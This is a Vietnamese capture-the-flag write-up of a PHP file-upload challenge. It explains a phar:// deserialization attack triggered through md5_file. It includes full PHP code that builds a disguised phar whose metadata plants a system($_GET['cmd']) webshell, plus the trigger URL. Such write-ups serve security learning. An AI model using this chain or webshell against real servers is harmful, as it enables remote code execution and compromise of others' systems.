Đề cho một trang web có chức năng upload file và filter extension 
```php
  $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
  $disallowedExtensions = ['php', 'php5', 'php6', 'php7', 'php8'];

```
Mình thử các các extension trong bài viết [này](https://book.hacktricks.xyz/pentesting-web/file-upload) nhưng đều không up được webshell lên. 

Sau một hồi đọc suorce thì thấy có file `logging.php` có hàm `__destruct()` với cả tên container của docker là `insecure-deserialization` thì mình nghĩ ngay đến lỗ hổng insecure-deserialization.
```php
<?php
class LogFile {
    public $filename;
    public $fcontents;

    public function writeToFile() {
        if (!empty($this->filename) && !empty($this->fcontents)) {
            file_put_contents($this->filename, $this->fcontents . PHP_EOL, FILE_APPEND);
        }
    }

    public function __destruct() {
        $this->writeToFile();
    }
}

?>
```
Nhưng mình tìm ở các file khác thì không có sử dụng hàm `unserialize` nên lúc này khá bí. Challenge để tên là `File checksum` sử dụng md5, mình thử search một hồi thì tìm thấy được bài viết [này](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization).
Bài viết đề cập đến lỗi của các hàm file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() hay filesize(), khi truyền tham số là một wrapper với protocol là `phar://file.phar` thì sẽ thực hiện đọc các dữ liệu của file phar đó. Và thực hiện unserialize phần dữ liệu `Meta-data` do phần này trong [file phar](https://www.php.net/manual/en/phar.fileformat.manifestfile.php) được lưu trữ dưới định dạng serialize.

Dựa trên lỗi này mình tận dụng class LogFile có hàm `writeToFile()` được gọi khi `__destruct()` để upload webshell với 2 tham số là tên file và nội dung. Trước hết là tạo file phar với phần meta-data là serialize class `Logfile` có biến `fcontents` là webshell.
Code gen file phar
```php
<?php

class LogFile {
    public $filename;
    public $fcontents;

    public function writeToFile() {
        if (!empty($this->filename) && !empty($this->fcontents)) {
            file_put_contents($this->filename, $this->fcontents . PHP_EOL, FILE_APPEND);
        }
    }

    public function __destruct() {
        $this->writeToFile();
    }
}

// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new LogFile();
$object->filename="uploads/shell.php";
$object->fcontents= "<?php system(\$_GET[\"cmd\"]); ?>";
$phar->setMetadata($object);
$phar->stopBuffering();
```
Upload file phar
![image](https://github.com/user-attachments/assets/f36b9a45-3475-44fe-8f04-02c786cf658b)

Sau khi có đường dẫn file phar thì chạy file `checksum.php` với tham số `?file=phar://uploads/672e6276bd4fe_test.phar` để tạo file webshell.

![image](https://github.com/user-attachments/assets/7afec38b-294b-4ac8-b8c1-11fbdcf6d6af)


Giờ chỉ việc chạy webshell đế lấy flag thôi
![image](https://github.com/user-attachments/assets/07320168-1239-4cea-abd6-077ba1618384)


